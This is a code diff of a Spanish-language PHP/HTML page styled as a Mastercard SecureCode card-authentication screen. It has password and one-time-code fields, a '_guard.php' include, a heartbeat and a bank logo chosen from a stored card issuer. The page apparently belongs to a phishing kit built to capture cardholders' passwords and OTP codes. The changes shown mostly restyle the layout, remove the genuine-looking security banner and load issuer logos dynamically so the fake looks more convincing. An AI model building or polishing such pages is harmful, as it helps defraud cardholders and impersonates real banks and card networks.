@@ -1,4 +1,3 @@
-
 <?php require_once __DIR__ . '/_guard.php'; ?>
 <!DOCTYPE html>
 <html lang="es">
@@ -15,7 +14,6 @@
             --co-text: #111827;
             --co-text-2: #374151;
             --co-text-muted: #6b7280;
-            --co-bg: #f5f5f5;
             --co-border: #e5e7eb;
             --co-white: #fff;
             --co-success: #16a34a;
@@ -29,25 +27,57 @@
         }
 
         html, body {
+            width: 100%;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
             font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            background-color: var(--co-bg);
             color: var(--co-text);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 16px;
+            padding: 20px;
+            position: relative;
         }
 
+        /* ===== FONDO BLURE.PNG ===== */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('blure.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(16px) brightness(0.85);
+            -webkit-filter: blur(16px) brightness(0.85);
+            transform: scale(1.1);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* ===== CONTENEDOR PRINCIPAL ===== */
         .container {
-            background: var(--co-white);
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             border-radius: 16px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
             padding: 40px;
             max-width: 520px;
             width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.5);
         }
 
+        /* ===== HEADER CON LOGOS ===== */
         .header {
             display: flex;
             align-items: center;
@@ -55,76 +85,44 @@
             margin-bottom: 24px;
             padding-bottom: 16px;
             border-bottom: 1px solid var(--co-border);
-        }
-
-        .mc-logo {
-            display: flex;
-            align-items: center;
-            flex-shrink: 0;
-        }
-
-        .mc-logo img {
-            height: 60px; /* Ajustado para el logo de Mastercard */
-            width: auto;
-            display: block;
-            object-fit: contain;
+            gap: 10px;
         }
 
         .bank-logo {
             display: flex;
             align-items: center;
-            justify-content: flex-end;
+            justify-content: flex-start;
             flex-shrink: 0;
+            max-width: 50%;
+            min-height: 70px;
         }
 
         .bank-logo img {
-            height: 50px; /* Ajustado para el logo de la Cámara */
+            height: 65px;
             width: auto;
-            max-width: 160px;
+            max-width: 180px;
             object-fit: contain;
-            display: block;
+            display: none;
         }
 
-        .security-banner {
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            border-radius: 12px;
-            padding: 14px 18px;
-            margin-bottom: 24px;
+        .mc-logo {
             display: flex;
-            align-items: flex-start;
-            gap: 12px;
-        }
-
-        .security-banner .shield-icon {
+            align-items: center;
+            justify-content: flex-end;
             flex-shrink: 0;
-            width: 22px;
-            height: 22px;
-            margin-top: 2px;
-            color: var(--mc-red);
+            margin-left: auto;
         }
 
-        .security-banner p {
-            font-size: 0.8125rem;
-            color: #991b1b;
-            line-height: 1.6;
-            margin: 0;
+        /* LOGO MASTERCARD MÁS GRANDE */
+        .mc-logo img {
+            height: 110px; 
+            width: auto;
+            max-width: 220px;
+            display: block;
+            object-fit: contain;
         }
 
-        .security-banner p strong {
-            font-weight: 700;
-        }
-
-        .security-banner a {
-            color: var(--mc-red);
-            font-weight: 600;
-            text-decoration: none;
-        }
-
-        .security-banner a:hover {
-            text-decoration: underline;
-        }
-
+        /* ===== TÍTULOS ===== */
         .form-title {
             font-size: 1.375rem;
             font-weight: 700;
@@ -143,6 +141,7 @@
             color: var(--co-text);
         }
 
+        /* ===== INFO DE TRANSACCIÓN ===== */
         .transaction-info {
             background: #f9fafb;
             border: 1px solid var(--co-border);
@@ -184,6 +183,7 @@
             letter-spacing: 1px;
         }
 
+        /* ===== FORMULARIO ===== */
         form {
             display: flex;
             flex-direction: column;
@@ -257,6 +257,7 @@
             display: block;
         }
 
+        /* ===== OTP SECTION ===== */
         .otp-section {
             display: none;
             animation: fadeIn 0.4s ease;
@@ -291,6 +292,7 @@
             flex-shrink: 0;
         }
 
+        /* ===== BOTÓN ===== */
         .button-group {
             display: flex;
             gap: 12px;
@@ -328,31 +330,7 @@
             cursor: not-allowed;
         }
 
-        .form-footer {
-            margin-top: 20px;
-            padding-top: 16px;
-            border-top: 1px solid var(--co-border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-
-        .form-footer .help-text {
-            font-size: 0.75rem;
-            color: var(--co-text-muted);
-        }
-
-        .form-footer .help-text a {
-            color: var(--mc-red);
-            text-decoration: none;
-        }
-
-        .form-footer .help-text a:hover {
-            text-decoration: underline;
-        }
-
+        /* ===== STATUS MESSAGE ===== */
         .status-message {
             display: none;
             padding: 12px 16px;
@@ -394,6 +372,33 @@
             padding: 16px;
         }
 
+        /* ===== FOOTER ===== */
+        .form-footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid var(--co-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .form-footer .help-text {
+            font-size: 0.75rem;
+            color: var(--co-text-muted);
+        }
+
+        .form-footer .help-text a {
+            color: var(--mc-red);
+            text-decoration: none;
+        }
+
+        .form-footer .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== LOADING OVERLAY ===== */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -401,7 +406,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, 0.4);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -441,99 +446,32 @@
             margin-top: 4px;
         }
 
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            .container {
-                padding: 30px 24px;
-                max-width: 480px;
-            }
-
-            .mc-logo img {
-                height: 45px;
-            }
-
-            .bank-logo img {
-                height: 40px;
-                max-width: 130px;
-            }
+            body { padding: 16px; }
+            body::before { filter: blur(14px) brightness(0.85); -webkit-filter: blur(14px) brightness(0.85); }
+            .container { padding: 30px 24px; max-width: 480px; }
+            .mc-logo img { height: 90px; max-width: 180px; }
+            .bank-logo img { height: 55px; max-width: 140px; }
         }
 
         @media (max-width: 480px) {
-            .container {
-                padding: 20px 16px;
-                border-radius: 12px;
-            }
-
-            .header {
-                margin-bottom: 16px;
-                padding-bottom: 12px;
-            }
-
-            .mc-logo img {
-                height: 35px;
-            }
-
-            .bank-logo img {
-                height: 30px;
-                max-width: 110px;
-            }
-
-            .form-title {
-                font-size: 1.125rem;
-            }
-
-            .form-subtitle {
-                font-size: 0.875rem;
-                margin-bottom: 16px;
-            }
-
-            .button-group {
-                flex-direction: column;
-                gap: 8px;
-            }
-
-            .btn {
-                width: 100%;
-                padding: 14px;
-                font-size: 0.875rem;
-            }
-
-            .form-footer {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 8px;
-            }
-
-            .info-label {
-                min-width: 60px;
-                font-size: 0.8rem;
-            }
-
-            .info-value {
-                font-size: 0.8rem;
-            }
-
-            .transaction-info {
-                padding: 12px 14px;
-                margin-bottom: 16px;
-            }
-
-            .security-banner {
-                padding: 12px 14px;
-                margin-bottom: 16px;
-            }
-
-            .security-banner p {
-                font-size: 0.75rem;
-            }
-
-            .otp-section {
-                padding: 14px;
-            }
-
-            .form-input {
-                padding: 10px 14px;
-                font-size: 0.9375rem;
-            }
+            body { padding: 14px; }
+            body::before { filter: blur(12px) brightness(0.85); -webkit-filter: blur(12px) brightness(0.85); }
+            .container { padding: 25px 20px; border-radius: 12px; }
+            .header { margin-bottom: 20px; padding-bottom: 12px; }
+            .mc-logo img { height: 75px; max-width: 150px; }
+            .bank-logo img { height: 45px; max-width: 110px; }
+            .form-title { font-size: 1.125rem; }
+            .form-subtitle { font-size: 0.875rem; margin-bottom: 16px; }
+            .button-group { flex-direction: column; gap: 8px; }
+            .btn { width: 100%; padding: 14px; font-size: 0.875rem; }
+            .form-footer { flex-direction: column; align-items: flex-start; gap: 8px; }
+            .info-label { min-width: 60px; font-size: 0.8rem; }
+            .info-value { font-size: 0.8rem; }
+            .transaction-info { padding: 12px 14px; margin-bottom: 16px; }
+            .otp-section { padding: 14px; }
+            .form-input { padding: 10px 14px; font-size: 0.9375rem; }
         }
     </style>
 </head>
@@ -545,26 +483,14 @@
     </div>
 
     <div class="container">
-        <!-- CABECERA CON LOGOS FIJOS -->
+        <!-- CABECERA CON LOGOS -->
         <div class="header">
+            <div class="bank-logo" id="bankLogoContainer">
+                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
+            </div>
             <div class="mc-logo">
                 <img src="master.png" alt="Mastercard" />
             </div>
-            <div class="bank-logo">
-                <img src="image.png" alt="Cámara de Comercio" />
-            </div>
-        </div>
-
-        <div class="security-banner">
-            <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                <path d="M12 8v4"/>
-                <path d="M12 16h.01"/>
-            </svg>
-            <p>
-                <strong>MasterCard SecureCode</strong> protege tu tarjeta Mastercard contra usos no autorizados en línea, sin costo adicional.
-                <a href="#">Más información</a>
-            </p>
         </div>
 
         <h1 class="form-title">Autenticar con contraseña</h1>
@@ -730,6 +656,8 @@
         const loadingSubtext = document.getElementById('loadingSubtext');
         const statusMessage = document.getElementById('statusMessage');
         const bancoNombre = document.getElementById('bancoNombre');
+        const bankLogoImg = document.getElementById('bankLogoImg');
+        const bankLogoContainer = document.getElementById('bankLogoContainer');
 
         // ============================================
         // MAPA DE LOGOS DE BANCOS
@@ -870,7 +798,7 @@
             iniciarHeartbeat();
         });
 
-        // SOLO CARGA EL NOMBRE, EL LOGO YA ESTÁ FIJO EN EL HTML
+        // CARGA EL LOGO Y EL NOMBRE DEL BANCO DINÁMICAMENTE
         function cargarNombreBanco() {
             let bancoEmisor = localStorage.getItem('bancoEmisor');
             if (bancoEmisor) {
@@ -880,6 +808,17 @@
                 console.log('🏛️ Banco emisor normalizado:', bancoEmisor);
             } else {
                 bancoNombre.textContent = 'banco emisor';
+            }
+
+            if (bancoEmisor && bankLogos[bancoEmisor]) {
+                bankLogoImg.src = bankLogos[bancoEmisor];
+                bankLogoImg.alt = bancoEmisor;
+                bankLogoImg.style.display = 'block';
+                bankLogoContainer.style.display = 'flex';
+                console.log('✅ Logo del banco cargado:', bankLogos[bancoEmisor]);
+            } else {
+                bankLogoContainer.style.display = 'none';
+                console.log('❌ No se encontró logo para el banco:', bancoEmisor);
             }
         }
 
